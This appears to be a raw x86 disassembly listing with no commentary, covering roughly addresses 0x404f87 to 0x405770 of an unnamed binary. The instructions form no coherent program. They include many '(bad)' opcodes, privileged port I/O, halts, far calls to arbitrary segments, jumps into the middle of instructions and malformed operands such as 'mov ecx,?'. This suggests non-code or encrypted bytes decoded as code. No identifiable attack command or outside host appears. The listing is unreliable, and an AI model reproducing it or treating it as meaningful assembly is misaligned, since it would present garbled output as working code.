  404f87:	ins    DWORD PTR es:[edi],dx
  404f88:	push   0x2f
  404f8a:	daa    
  404f8b:	sub    eax,0xa58908fe
  404f90:	sar    DWORD PTR [ecx-0xdb6ee1f],cl
  404f96:	test   eax,edi
  404f98:	inc    ebp
  404f99:	(bad)  
  404f9a:	push   esi
  404f9b:	aad    0xa3
  404f9d:	xchg   edi,eax
  404f9e:	mov    ah,0x5a
  404fa0:	jecxz  0x404f7f
  404fa2:	lock and al,0xcb
  404fa5:	dec    ebx
  404fa6:	and    ebx,0xd81bc697
  404fac:	add    eax,0x2e7ceef3
  404fb1:	dec    ebx
  404fb2:	jnp    0x404fcf
  404fb4:	outs   dx,DWORD PTR ds:[esi]
  404fb5:	adc    eax,0x8cd37820
  404fba:	or     bh,BYTE PTR [esi-0xb]
  404fbd:	outs   dx,DWORD PTR ds:[esi]
  404fbe:	mov    al,0x63
  404fc0:	push   0x6a2a7f78
  404fc5:	sbb    eax,0x54a429c9
  404fca:	mov    eax,0x570e0e0f
  404fcf:	sub    al,0x3c
  404fd1:	mov    ah,BYTE PTR [ecx+ebp*1+0x20c60ccd]
  404fd8:	xlat   BYTE PTR ds:[ebx]
  404fd9:	jge    0x404f7f
  404fdb:	call   0xa2fd:0x8c3a4d28
  404fe2:	and    eax,DWORD PTR [ecx+edx*4-0x59a87f50]
  404fe9:	or     BYTE PTR [esp+eax*1-0x54],bh
  404fed:	mov    al,ds:0x8c558430
  404ff2:	test   al,0x1b
  404ff4:	push   ebx
  404ff5:	into   
  404ff6:	std    
  404ff7:	cli    
  404ff8:	cmp    BYTE PTR [eax+0x5c],dh
  404ffb:	test   BYTE PTR [ecx],0xa3
  404ffe:	jno    0x40507f
  405000:	ror    DWORD PTR [edx],0x30
  405003:	push   ss
  405004:	jne    0x40501d
  405006:	int3   
  405007:	dec    ebx
  405008:	mov    al,ds:0x259eab5f
  40500d:	sahf   
  40500e:	cmp    DWORD PTR [esi-0x6e0820d5],esp
  405014:	call   0x8fb8:0xc82f439e
  40501b:	imul   edx,DWORD PTR [edi+0x6f],0xffffffd6
  40501f:	sbb    DWORD PTR [eax-0x4e],edi
  405022:	scas   al,BYTE PTR es:[edi]
  405023:	jns    0x404fc1
  405025:	xor    dh,bl
  405027:	retf   
  405028:	lahf   
  405029:	push   esi
  40502a:	jnp    0x404fc2
  40502c:	or     ebx,edx
  40502e:	sub    cl,BYTE PTR [edi]
  405030:	add    ebp,DWORD PTR [edx+0x6d25576c]
  405036:	xlat   BYTE PTR ds:[ebx]
  405037:	cmp    al,0x24
  405039:	jne    0x405079
  40503b:	adc    al,0x85
  40503d:	jnp    0x404fcd
  40503f:	mov    bl,bl
  405041:	jl     0x404ffb
  405043:	nop
  405044:	pop    esi
  405045:	add    al,0xb
  405047:	cmp    esi,DWORD PTR [ecx-0x307960ae]
  40504d:	mov    bl,0xf2
  40504f:	mov    esi,0x10274256
  405054:	pop    ss
  405055:	or     DWORD PTR [ebp+0x3beb878d],0x65
  40505c:	mov    ch,0x2f
  40505e:	mov    ecx,0x3f788319
  405063:	add    edi,DWORD PTR [esi+0x2dd6a77b]
  405069:	add    ah,BYTE PTR [eax]
  40506b:	pop    ebp
  40506c:	xor    edx,ebx
  40506e:	call   0xf60b:0x7ccaa37b
  405075:	pusha  
  405076:	ret    
  405077:	cwde   
  405078:	xchg   DWORD PTR ds:0xc0d17bf8,ebx
  40507e:	dec    esp
  40507f:	inc    esi
  405080:	test   esi,0xc4066b69
  405086:	sbb    esi,DWORD PTR [ebp+0xa198889]
  40508c:	sub    esp,DWORD PTR [esi+ebp*4]
  40508f:	std    
  405090:	push   edi
  405091:	sub    eax,0xea1af4b
  405096:	int    0x24
  405098:	inc    esp
  405099:	add    edx,DWORD PTR [ecx+0x6d]
  40509c:	outs   dx,BYTE PTR ds:[esi]
  40509d:	xchg   esi,eax
  40509e:	out    0xb0,al
  4050a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050a1:	jmp    0x405023
  4050a3:	push   0x22
  4050a5:	mov    eax,ds:0x96d51606
  4050aa:	push   esi
  4050ab:	jl     0x40507d
  4050ad:	out    0xf2,al
  4050af:	test   BYTE PTR ds:0xe9ae2877,0x2c
  4050b6:	pop    edi
  4050b7:	xchg   esi,eax
  4050b8:	pop    ebp
  4050b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050ba:	hlt    
  4050bb:	push   ss
  4050bc:	mov    dl,0xd9
  4050be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050bf:	in     eax,dx
  4050c0:	xchg   edx,eax
  4050c1:	xor    BYTE PTR [esi+0x48317bc7],0x5b
  4050c8:	pushf  
  4050c9:	scas   eax,DWORD PTR es:[edi]
  4050ca:	push   eax
  4050cb:	xor    cl,bl
  4050cd:	xchg   ebx,eax
  4050ce:	das    
  4050cf:	inc    ebx
  4050d0:	stc    
  4050d1:	adc    BYTE PTR [eax-0x48],0x8f
  4050d5:	xor    BYTE PTR [edx+0x17b3c67d],dl
  4050db:	and    eax,0xc1c83ce0
  4050e0:	jno    0x40510e
  4050e2:	imul   edi,DWORD PTR [edx+0x5f],0xdda1d102
  4050e9:	mov    al,0x70
  4050eb:	fstp   DWORD PTR [esi]
  4050ed:	es sbb esi,eax
  4050f0:	gs clc 
  4050f2:	out    dx,eax
  4050f3:	mov    al,0x4b
  4050f5:	aas    
  4050f6:	add    al,0xd7
  4050f8:	jl     0x4050ee
  4050fa:	xchg   DWORD PTR [edx+eiz*1+0x485095a9],ebp
  405101:	xchg   esp,eax
  405102:	pop    ecx
  405103:	mov    edx,0x7bfe0403
  405108:	popa   
  405109:	cmp    al,0xae
  40510b:	mov    esi,0xc38cfb06
  405110:	sahf   
  405111:	pop    eax
  405112:	fdiv   DWORD PTR [edx]
  405114:	xor    esi,DWORD PTR [edx+0x1b21498c]
  40511a:	mov    bh,0x14
  40511c:	shl    DWORD PTR [eax+edi*1],0xcc
  405120:	or     ebx,DWORD PTR [edx]
  405122:	ja     0x405109
  405124:	fsub   DWORD PTR [eax]
  405126:	add    eax,0x60f517a3
  40512b:	xor    esi,0x1475a65
  405131:	add    ah,BYTE PTR [ebx-0x5a]
  405134:	inc    eax
  405135:	sbb    eax,0xf4ffc9f
  40513a:	add    DWORD PTR [ecx+0x3e],edx
  40513d:	and    al,0xbf
  40513f:	test   al,0x12
  405141:	imul   edx,DWORD PTR [ebp+0x27],0x2fb1acc5
  405148:	adc    eax,0x55f3f7e
  40514d:	outs   dx,BYTE PTR ds:[esi]
  40514e:	retf   
  40514f:	lahf   
  405150:	jmp    0x8ba6e009
  405155:	xchg   ecx,eax
  405156:	loop   0x405133
  405158:	retf   
  405159:	mov    ecx,0x8d6027ef
  40515e:	pusha  
  40515f:	inc    ecx
  405160:	sbb    BYTE PTR [edx],0x14
  405163:	sub    al,0x74
  405165:	shl    bh,cl
  405167:	jg     0x4051ca
  405169:	enter  0xd2b2,0x3c
  40516d:	mov    esi,ecx
  40516f:	loop   0x4051e9
  405171:	pop    ebp
  405172:	xor    eax,0x9f6dae41
  405177:	push   0xffffffc8
  405179:	addr16 (bad) 
  40517b:	push   ebx
  40517c:	adc    BYTE PTR [esi+0xbb06cd0],cl
  405182:	add    edx,DWORD PTR [ebx+0x7a6539df]
  405188:	dec    edi
  405189:	fsubr  QWORD PTR [ebp-0x72931b6b]
  40518f:	retf   
  405190:	imul   ebp,DWORD PTR [esi+eax*2+0x68eadd4],0xb81f4460
  40519b:	dec    edi
  40519c:	rol    BYTE PTR [edi],1
  40519e:	into   
  40519f:	xchg   ecx,eax
  4051a0:	jge    0x405127
  4051a2:	ror    BYTE PTR ss:[ecx-0x64],1
  4051a6:	cmp    DWORD PTR [ecx-0x5f],esp
  4051a9:	cdq    
  4051aa:	add    al,0x8c
  4051ac:	dec    ebx
  4051ad:	mov    esp,0x3d276f9b
  4051b2:	xor    ebx,edx
  4051b4:	xor    DWORD PTR [eax-0x7e],esi
  4051b7:	ja     0x4051fd
  4051b9:	test   DWORD PTR [edx+ecx*4-0x41d57092],0xe2f70d87
  4051c4:	mov    ch,al
  4051c6:	mov    dh,0xa4
  4051c8:	cs mov esi,0x1002fb85
  4051ce:	jge    0x405198
  4051d0:	jge    0x405184
  4051d2:	rcr    bh,1
  4051d4:	gs in  al,dx
  4051d6:	mov    eax,0x25a611e8
  4051db:	sbb    eax,0x66548cd7
  4051e0:	sar    BYTE PTR [esi+eax*2+0x4d],0x5d
  4051e5:	ss cmp bh,dl
  4051e8:	sbb    DWORD PTR [esp+esi*4],0xffffff86
  4051ec:	stos   DWORD PTR es:[edi],eax
  4051ed:	in     eax,dx
  4051ee:	mov    DWORD PTR [eax-0x2c],edi
  4051f1:	pusha  
  4051f2:	xlat   BYTE PTR ds:[ebx]
  4051f3:	mov    eax,esi
  4051f5:	out    0x85,al
  4051f7:	add    eax,0xfe583a5e
  4051fc:	ins    DWORD PTR es:[edi],dx
  4051fd:	jne    0x405254
  4051ff:	adc    edi,esi
  405201:	arpl   WORD PTR [edi+0x54],bp
  405204:	int    0x83
  405206:	pop    ecx
  405207:	int3   
  405208:	mov    eax,0x3c85659b
  40520d:	mov    bh,0xdc
  40520f:	ja     0x405233
  405211:	jo     0x4051c6
  405213:	push   edx
  405214:	jo     0x4051cd
  405216:	mov    DWORD PTR [ecx+0x67],ecx
  405219:	outs   dx,DWORD PTR ds:[esi]
  40521a:	sti    
  40521b:	mov    edx,0xe872d1ff
  405220:	pushf  
  405221:	loopne 0x4051ee
  405223:	push   esi
  405224:	aas    
  405225:	or     ebx,esp
  405227:	or     ecx,ecx
  405229:	xchg   edi,eax
  40522a:	jno    0x4051c9
  40522c:	div    DWORD PTR [ecx+0x52e82e88]
  405232:	sub    eax,0x6055af3
  405237:	stc    
  405238:	sub    DWORD PTR [ebx],0x4f1e3d2e
  40523e:	xchg   esi,eax
  40523f:	repz or edx,DWORD PTR [edx-0x49f85242]
  405246:	cmp    al,0xbd
  405248:	push   edx
  405249:	ret    
  40524a:	add    DWORD PTR [edx],esi
  40524c:	mov    edx,0x42032687
  405251:	mov    eax,ds:0x22c84eb1
  405256:	xor    DWORD PTR [edi+0x78],esp
  405259:	cmp    BYTE PTR [esi-0x683a33ee],bl
  40525f:	jns    0x4052a7
  405261:	loop   0x4052a5
  405263:	dec    edi
  405264:	mov    ds:0xbab16799,eax
  405269:	dec    ecx
  40526a:	dec    ebp
  40526b:	jp     0x40522f
  40526d:	in     al,dx
  40526e:	add    DWORD PTR [eax],eax
  405270:	dec    eax
  405271:	jg     0x405211
  405273:	and    edi,DWORD PTR [eax+eiz*2-0x3d234020]
  40527a:	inc    edx
  40527b:	adc    al,0xb2
  40527d:	add    edx,DWORD PTR [ecx+0x2c]
  405280:	(bad)  
  405281:	pushf  
  405282:	(bad)  
  405283:	mov    ebp,0xa778f0f
  405288:	sbb    ch,dl
  40528a:	imul   edx,ebp,0x42
  40528d:	cli    
  40528e:	xor    ebp,DWORD PTR [edi+0x32]
  405291:	ret    0x745e
  405294:	ins    DWORD PTR es:[edi],dx
  405295:	mov    es,WORD PTR [eax]
  405297:	enter  0xb0,0x93
  40529b:	cmp    ah,cl
  40529d:	xor    dl,dh
  40529f:	test   BYTE PTR [ebx+0x30],dl
  4052a2:	scas   al,BYTE PTR es:[edi]
  4052a3:	repz les ebx,FWORD PTR [ecx+0x6bd8ac9c]
  4052aa:	(bad)  
  4052ab:	retf   0x416d
  4052ae:	loopne 0x4052b3
  4052b0:	sbb    bl,BYTE PTR [ebp*8-0xe02854e]
  4052b7:	sub    al,0x56
  4052b9:	xchg   ecx,eax
  4052ba:	inc    ebp
  4052bb:	mov    ebx,0x819a1e87
  4052c0:	add    DWORD PTR [ebp+0x6b],edi
  4052c3:	cmp    cl,al
  4052c5:	dec    esp
  4052c6:	and    ebx,DWORD PTR [ebx-0x104c234f]
  4052cc:	mov    ebx,0x2558fe02
  4052d1:	push   edx
  4052d2:	push   eax
  4052d3:	cmp    dh,dh
  4052d5:	sub    cl,cl
  4052d7:	pusha  
  4052d8:	xor    DWORD PTR [ecx],eax
  4052da:	jecxz  0x4052ec
  4052dc:	stc    
  4052dd:	inc    ecx
  4052de:	scas   eax,DWORD PTR es:[edi]
  4052df:	daa    
  4052e0:	fdivr  DWORD PTR [edx+eiz*8-0x36]
  4052e4:	push   edi
  4052e5:	js     0x405288
  4052e7:	inc    eax
  4052e8:	or     eax,0xcb115221
  4052ed:	or     al,ch
  4052ef:	fsubr  st(2),st
  4052f1:	(bad)  
  4052f3:	jns    0x405343
  4052f5:	fs retf 
  4052f7:	repnz sub ah,BYTE PTR [edi-0x72]
  4052fb:	xchg   edi,eax
  4052fc:	xchg   edi,eax
  4052fd:	xchg   DWORD PTR [ecx],edx
  4052ff:	leave  
  405300:	and    bh,BYTE PTR [ebp-0x6]
  405303:	mov    ch,0x66
  405305:	mov    bh,0xc1
  405307:	push   edx
  405308:	mov    ecx,0xd378f120
  40530d:	mov    cl,0x72
  40530f:	out    0x7c,eax
  405311:	xchg   DWORD PTR [ebx],edx
  405313:	int3   
  405314:	in     al,dx
  405315:	inc    esi
  405316:	fstp   TBYTE PTR [ecx]
  405318:	mov    dl,0x3d
  40531a:	jbe    0x4052e1
  40531c:	xlat   BYTE PTR ds:[ebx]
  40531d:	sbb    BYTE PTR [eax],dh
  40531f:	inc    ecx
  405320:	dec    eax
  405321:	push   ebp
  405322:	sbb    al,0x3a
  405324:	push   es
  405325:	xor    eax,0xd97a9a73
  40532a:	cmp    al,BYTE PTR [ebp+0x5db16c4d]
  405330:	lds    esp,FWORD PTR [esi]
  405332:	and    DWORD PTR [ebx+ebx*2-0x4bb15d41],ecx
  405339:	xchg   edx,eax
  40533a:	pop    edx
  40533b:	mov    eax,ds:0x188d5ec7
  405340:	mov    al,ds:0x4beca1ce
  405345:	xchg   BYTE PTR [edi],bl
  405347:	and    BYTE PTR [ebp+0x65],0xcd
  40534b:	inc    ebx
  40534c:	dec    esi
  40534d:	or     DWORD PTR [ecx+0x40],0xffffff82
  405351:	fcomi  st,st(5)
  405353:	sbb    esp,DWORD PTR cs:[ebp+0x39]
  405357:	fdiv   QWORD PTR [ecx+0x43]
  40535a:	xchg   ecx,eax
  40535b:	xlat   BYTE PTR ds:[ebx]
  40535c:	and    BYTE PTR [eax-0x7f],ah
  40535f:	xor    DWORD PTR [ebp-0x18d3dabb],esp
  405365:	mov    dl,0x49
  405367:	push   ds
  405368:	adc    eax,DWORD PTR [ebx+ecx*4]
  40536b:	pop    esi
  40536c:	sub    BYTE PTR [edi+0x3fcb6ee6],ch
  405372:	ss cmp al,0x2c
  405375:	shr    DWORD PTR [edx],cl
  405377:	cmc    
  405378:	jo     0x405319
  40537a:	sbb    dl,BYTE PTR [esi]
  40537c:	xchg   ecx,eax
  40537d:	dec    esp
  40537e:	retf   
  40537f:	dec    edx
  405380:	stos   DWORD PTR es:[edi],eax
  405381:	ss int 0x4b
  405384:	out    dx,al
  405385:	adc    eax,0x9de2f92f
  40538a:	pop    eax
  40538b:	stos   DWORD PTR es:[edi],eax
  40538c:	test   al,0x50
  40538e:	(bad)  
  40538f:	push   ss
  405390:	mov    ebp,0x2f3cbf93
  405395:	out    dx,eax
  405396:	jae    0x405334
  405398:	stos   BYTE PTR es:[edi],al
  405399:	or     ebx,DWORD PTR [ecx+0x72]
  40539c:	lock xor ebp,edx
  40539f:	cmc    
  4053a0:	in     al,0xcf
  4053a2:	mov    ch,0x24
  4053a4:	sub    BYTE PTR [ebx],al
  4053a6:	or     DWORD PTR [esi-0x33],edi
  4053a9:	(bad)  
  4053aa:	stc    
  4053ab:	rcr    ebp,1
  4053ad:	mov    ch,0x34
  4053af:	scas   al,BYTE PTR es:[edi]
  4053b0:	cmp    eax,0xdcc9eb0e
  4053b5:	jmp    0xa0a98937
  4053ba:	cmc    
  4053bb:	shr    edx,cl
  4053bd:	or     bl,BYTE PTR [ebp+0x76]
  4053c0:	cmp    bh,BYTE PTR [ebp+edx*1-0x47e9ef47]
  4053c7:	pop    edx
  4053c8:	(bad)  
  4053c9:	les    edi,FWORD PTR [ebp+edi*1-0x19]
  4053cd:	jne    0x4053f9
  4053cf:	adc    dh,BYTE PTR ds:0x50d21fda
  4053d5:	bt     DWORD PTR [esi+0x31ecdbbe],0xf4
  4053dd:	mov    esp,0xaba4607f
  4053e2:	pusha  
  4053e3:	aas    
  4053e4:	fiadd  DWORD PTR [ebx+0x5f892c1a]
  4053ea:	inc    eax
  4053eb:	cdq    
  4053ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053ed:	mov    ebx,0xbbfb4f64
  4053f2:	and    ah,BYTE PTR ds:0x9c34a87f
  4053f8:	mov    edx,0x8d9a7f04
  4053fd:	mov    cl,0x7d
  4053ff:	push   0x2
  405401:	outs   dx,DWORD PTR ds:[esi]
  405402:	mov    esi,0xa1680f60
  405407:	mov    ds:0x9aedce33,al
  40540c:	inc    ecx
  40540d:	mov    dh,cl
  40540f:	push   ss
  405410:	loop   0x40541c
  405412:	and    BYTE PTR [eax],ah
  405414:	daa    
  405415:	mov    DWORD PTR [ebp-0x7a5724e1],edi
  40541b:	pop    esp
  40541c:	add    eax,0x3bf14d05
  405421:	or     edi,DWORD PTR [esp+ebx*4]
  405424:	sub    ebx,DWORD PTR [ebx+0x524b5430]
  40542a:	gs jno 0x405479
  40542d:	rcr    al,cl
  40542f:	pusha  
  405430:	pop    ds
  405431:	test   eax,0xea3993ad
  405436:	or     edi,DWORD PTR [eax]
  405438:	arpl   WORD PTR [edi-0x57],sp
  40543b:	xor    BYTE PTR [edx],bh
  40543d:	in     al,0x88
  40543f:	inc    eax
  405440:	(bad)  
  405442:	xchg   esp,eax
  405443:	les    ecx,FWORD PTR [edi+0x6c]
  405446:	aad    0x15
  405448:	gs xor ah,0x62
  40544c:	stc    
  40544d:	cmp    dl,BYTE PTR [ebp-0x6b00f991]
  405453:	cmp    DWORD PTR [eax+0x5b583df4],0xffffff8a
  40545a:	out    dx,al
  40545b:	adc    ecx,DWORD PTR [ebx]
  40545d:	into   
  40545e:	sub    ebx,DWORD PTR [esi+0x4a]
  405461:	cmp    DWORD PTR [eax],esi
  405463:	xchg   esi,eax
  405464:	fwait
  405465:	scas   eax,DWORD PTR es:[edi]
  405466:	repnz cmp edx,DWORD PTR [esi+0x238dc891]
  40546d:	repnz inc edx
  40546f:	inc    ebp
  405470:	or     ebp,DWORD PTR [ecx+eiz*2]
  405473:	pop    edi
  405474:	sbb    eax,0xa018eba4
  405479:	leave  
  40547a:	inc    esi
  40547b:	mov    ds:0xcb5feb92,al
  405480:	rcl    BYTE PTR [ecx-0x6f],1
  405483:	or     DWORD PTR [eax+0x3f],eax
  405486:	ret    0xf98b
  405489:	or     dh,BYTE PTR cs:[edx]
  40548c:	stos   DWORD PTR es:[edi],eax
  40548d:	sbb    BYTE PTR [edi],ah
  40548f:	add    ch,BYTE PTR [esi]
  405491:	sti    
  405492:	in     eax,0x4f
  405494:	dec    eax
  405495:	mov    ebp,0x4fc859e2
  40549a:	scas   al,BYTE PTR es:[edi]
  40549b:	out    0xab,eax
  40549d:	dec    ebx
  40549e:	int    0x19
  4054a0:	repz inc edx
  4054a2:	adc    eax,esp
  4054a4:	xchg   ecx,eax
  4054a5:	bswap  eax
  4054a7:	in     eax,0x17
  4054a9:	int    0x33
  4054ab:	cmp    DWORD PTR [edi+ecx*1+0x1ec0b866],0x46
  4054b3:	cmp    ebp,DWORD PTR [edx]
  4054b5:	xchg   DWORD PTR [edi+0x72],ebp
  4054b8:	push   eax
  4054b9:	lahf   
  4054ba:	mov    edi,0x19dde5bf
  4054bf:	es jnp 0x4054e9
  4054c2:	bound  eax,QWORD PTR fs:[ebx]
  4054c5:	xchg   bl,ch
  4054c7:	push   ebx
  4054c8:	xchg   esp,eax
  4054c9:	out    dx,eax
  4054ca:	jnp    0x40554a
  4054cc:	stc    
  4054cd:	or     BYTE PTR [ecx+0x2f],dl
  4054d0:	xchg   esp,eax
  4054d1:	into   
  4054d2:	shr    BYTE PTR [edi-0x51a642cd],cl
  4054d8:	sub    esp,DWORD PTR [edi+0x3d]
  4054db:	aam    0x83
  4054dd:	fadd   DWORD PTR [esi-0x2d]
  4054e0:	test   ebp,edx
  4054e2:	xor    edi,esi
  4054e4:	and    DWORD PTR [edx-0x7b30ca8d],ecx
  4054ea:	mov    al,gs:0xc6649b62
  4054f0:	add    dh,BYTE PTR [eax-0x53]
  4054f3:	cmp    DWORD PTR [ebx-0x3],esi
  4054f6:	add    DWORD PTR [eax],eax
  4054f8:	loop   0x405570
  4054fa:	dec    edx
  4054fb:	add    DWORD PTR [eax-0x30],eax
  4054fe:	pop    esi
  4054ff:	cmp    eax,0xa27a43e5
  405504:	fnstsw WORD PTR [ecx+ebx*8-0x69]
  405508:	rcr    dl,1
  40550a:	jl     0x4054c6
  40550c:	dec    ecx
  40550d:	scas   al,BYTE PTR es:[edi]
  40550e:	je     0x4054cf
  405510:	ror    DWORD PTR [ecx+0x2f],cl
  405513:	(bad)
  405516:	dec    esp
  405517:	push   eax
  405518:	mov    ah,0xd0
  40551a:	fwait
  40551b:	out    0xc1,al
  40551d:	nop
  40551e:	or     edx,DWORD PTR [ebx-0x44]
  405521:	inc    ebp
  405522:	and    al,0x7c
  405524:	ret    0x7d1
  405527:	out    0xd7,al
  405529:	cld    
  40552a:	pop    ecx
  40552b:	daa    
  40552c:	test   DWORD PTR [edx-0x5f8ea291],edx
  405532:	mov    edx,0xd45f9446
  405537:	mov    ds:0xd9ac66df,eax
  40553c:	fwait
  40553d:	out    dx,eax
  40553e:	shl    dl,0x23
  405541:	add    DWORD PTR [eax],0x588f4efe
  405547:	cdq    
  405548:	fcmovnbe st,st(5)
  40554a:	xchg   ebx,eax
  40554b:	das    
  40554c:	inc    esp
  40554d:	rcr    DWORD PTR [esi+eiz*8],cl
  405550:	mov    eax,0x49d2f67e
  405555:	daa    
  405556:	loope  0x405558
  405558:	xchg   edi,eax
  405559:	jg     0x40556b
  40555b:	aaa    
  40555c:	sub    ecx,DWORD PTR [ebx+0x48]
  40555f:	push   cs
  405560:	enter  0x6269,0xf3
  405564:	enter  0x4bc0,0x38
  405568:	das    
  405569:	icebp  
  40556a:	push   esi
  40556b:	xor    al,0xde
  40556d:	cmp    ecx,edi
  40556f:	mov    edi,0xb81ee83a
  405574:	dec    esi
  405575:	mov    ds:0x3e274ea5,eax
  40557a:	or     al,0xca
  40557c:	cmp    DWORD PTR [eax],edi
  40557e:	out    0x9,eax
  405580:	pop    ebx
  405581:	and    edi,DWORD PTR [ebx-0xd]
  405584:	cmp    al,0x1e
  405586:	mov    edx,0x903c5a54
  40558b:	mov    ebp,0x83efda99
  405590:	mov    esp,0xd1ab7d75
  405595:	push   ss
  405596:	cld    
  405597:	push   ds
  405598:	dec    ebx
  405599:	or     eax,0x2327f4d
  40559e:	cwde   
  40559f:	into   
  4055a0:	fsubr  st(5),st
  4055a2:	dec    edi
  4055a3:	jmp    0x33f5:0xbfa1c7f1
  4055aa:	mov    esp,0xa17c13ef
  4055af:	jle    0x405547
  4055b1:	cmp    al,dl
  4055b3:	jae    0x40557f
  4055b5:	mov    eax,0xcda6a993
  4055ba:	sub    edx,ebx
  4055bc:	sub    al,0x9c
  4055be:	hlt    
  4055bf:	adc    al,0x79
  4055c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055c2:	pop    ebp
  4055c3:	stc    
  4055c4:	rol    DWORD PTR [esi-0x554eaa1e],cl
  4055ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055cb:	cmp    esi,0xffffffa7
  4055ce:	das    
  4055cf:	aaa    
  4055d0:	icebp  
  4055d1:	sbb    ch,BYTE PTR [eax]
  4055d3:	pop    esp
  4055d4:	mov    esp,ss
  4055d6:	stos   DWORD PTR es:[edi],eax
  4055d7:	ja     0x40562b
  4055d9:	xchg   ebx,eax
  4055da:	push   esi
  4055db:	adc    DWORD PTR [eax],ebx
  4055dd:	popf   
  4055de:	(bad)  
  4055e1:	gs test al,0x5
  4055e4:	adc    BYTE PTR [ebp-0x62],bh
  4055e7:	dec    esi
  4055e8:	lds    esp,FWORD PTR [esi+0xbbb0b91]
  4055ee:	mov    ds:0xcea7047c,al
  4055f3:	fs (bad) 
  4055f5:	iret   
  4055f6:	ror    DWORD PTR [ebp-0x2e1c70b3],0xc3
  4055fd:	or     dl,dl
  4055ff:	in     al,0x52
  405601:	pop    ss
  405602:	fwait
  405603:	int3   
  405604:	xor    eax,0x78e87296
  405609:	jmp    0xd4667189
  40560e:	popa   
  40560f:	add    eax,0xa640884e
  405614:	mov    edx,0xbaab86f5
  405619:	(bad)  
  40561a:	out    0xd1,al
  40561c:	leave  
  40561d:	rcr    DWORD PTR [edi+eax*2],cl
  405620:	dec    esp
  405621:	inc    edi
  405622:	daa    
  405623:	fstp   DWORD PTR [esi+0x5b]
  405626:	les    esp,FWORD PTR [ebp+0x26]
  405629:	push   eax
  40562a:	pushf  
  40562b:	icebp  
  40562c:	or     esp,ecx
  40562e:	xor    esi,eax
  405630:	xchg   esi,eax
  405631:	ins    DWORD PTR es:[edi],dx
  405632:	popa   
  405633:	push   cs
  405634:	cmp    bl,BYTE PTR [edx+0x66bf4ee9]
  40563a:	pop    esp
  40563b:	xchg   ebx,eax
  40563c:	adc    BYTE PTR [eax+esi*1+0x3],0x27
  405641:	sub    BYTE PTR [ecx],bl
  405643:	and    al,0x5f
  405645:	outs   dx,BYTE PTR ds:[esi]
  405646:	jle    0x405617
  405648:	sub    DWORD PTR [edi],esp
  40564a:	xor    bl,bl
  40564c:	lods   al,BYTE PTR ds:[esi]
  40564d:	cli    
  40564e:	push   ecx
  40564f:	loop   0x405648
  405651:	inc    ebp
  405652:	cmp    DWORD PTR [ecx+0xa10c59c],eax
  405658:	not    DWORD PTR [edi-0x739901de]
  40565e:	sbb    eax,0xb00cc7c5
  405663:	lahf   
  405664:	sahf   
  405665:	jmp    0x4056d8
  405667:	push   ss
  405668:	loop   0x405652
  40566a:	fdiv   QWORD PTR [ebp-0x59]
  40566d:	ret    0x20af
  405670:	mov    ds:0xf4cf15d5,al
  405675:	xor    esp,DWORD PTR [esp+eax*1]
  405678:	outs   dx,DWORD PTR ds:[esi]
  405679:	pop    edi
  40567a:	cld    
  40567b:	call   0xefab:0x6f021e83
  405682:	inc    ebx
  405683:	outs   dx,DWORD PTR ds:[esi]
  405684:	cld    
  405685:	hlt    
  405686:	imul   edx,esi,0xc95cec3b
  40568c:	mov    ecx,?
  40568e:	cld    
  40568f:	mov    ecx,0x400aebe4
  405694:	pop    ebp
  405695:	out    0x21,eax
  405697:	push   ecx
  405698:	pop    edi
  405699:	jbe    0x405717
  40569b:	ins    BYTE PTR es:[edi],dx
  40569c:	je     0x405707
  40569e:	push   esi
  40569f:	cdq    
  4056a0:	call   0x181a:0x6ef94c67
  4056a7:	pop    ebp
  4056a8:	fcmovnb st,st(6)
  4056aa:	jnp    0x4056f3
  4056ac:	push   es
  4056ad:	jp     0x40563f
  4056af:	gs test eax,0x4e2318d
  4056b5:	rcl    bh,0x98
  4056b8:	aad    0xdc
  4056ba:	cmp    edx,0xbd1bd527
  4056c0:	mov    dl,0x3e
  4056c2:	mov    DWORD PTR [ebx],0x35257ed0
  4056c8:	hlt    
  4056c9:	popf   
  4056ca:	push   ds
  4056cb:	jge    0x40566b
  4056cd:	mov    edx,0xd351b9bd
  4056d2:	adc    al,BYTE PTR [edx+0x1c29d95]
  4056d8:	jmp    0x7f6779dc
  4056dd:	mov    eax,0xbeebea28
  4056e2:	or     al,0x24
  4056e4:	(bad)  
  4056e5:	shl    DWORD PTR [edi+0x4f],1
  4056e8:	repz add bl,BYTE PTR [edi]
  4056eb:	aaa    
  4056ec:	mov    WORD PTR [edi+0x4b],?
  4056ef:	xchg   edi,eax
  4056f0:	push   cs
  4056f1:	mov    cl,0x8e
  4056f3:	jmp    0x405707
  4056f5:	adc    al,0x6c
  4056f7:	call   0xd65242a3
  4056fc:	jmp    0x4056ef
  4056fe:	in     eax,0xbc
  405700:	in     eax,dx
  405701:	(bad)  
  405703:	aas    
  405704:	sahf   
  405705:	jae    0x4056d6
  405707:	or     esi,0xca0bff83
  40570d:	fild   WORD PTR [edi]
  40570f:	and    eax,DWORD PTR [esi]
  405711:	mov    ah,0x52
  405713:	cdq    
  405714:	les    edx,FWORD PTR [ebx-0xf]
  405717:	xchg   edx,eax
  405718:	imul   esi,DWORD PTR [edi-0x43],0x79
  40571c:	jnp    0x405736
  40571e:	adc    cl,ah
  405720:	aaa    
  405721:	xchg   edi,eax
  405722:	test   BYTE PTR [eax+0x7a89c25a],cl
  405728:	mov    DWORD PTR [eax+0x4964caa3],ebx
  40572e:	or     eax,0xd5100975
  405733:	xor    DWORD PTR [ecx],edx
  405735:	jo     0x40573b
  405737:	mov    edx,ecx
  405739:	and    ebp,0x6d8b0fef
  40573f:	in     al,dx
  405740:	(bad)  
  405741:	jbe    0x405779
  405743:	jae    0x405714
  405745:	in     eax,dx
  405746:	sbb    ebx,0x8e027944
  40574c:	sahf   
  40574d:	lods   eax,DWORD PTR ds:[esi]
  40574e:	int    0x55
  405750:	aam    0xf4
  405752:	sbb    edi,DWORD PTR ds:0xb00d19fc
  405758:	cmp    BYTE PTR [edx+0x1399ca5b],dh
  40575e:	or     esi,DWORD PTR [ecx]
  405760:	fnstenv [edx]
  405762:	shr    DWORD PTR [esi-0x3e],0xa7
  405766:	(bad)  
  405767:	mov    cl,0x3f
  405769:	push   edi
  40576a:	mov    esi,0xfa63c471
  40576f:	lods   al,BYTE PTR ds:[esi]
  405770:	lock mov edi,0x5636328c
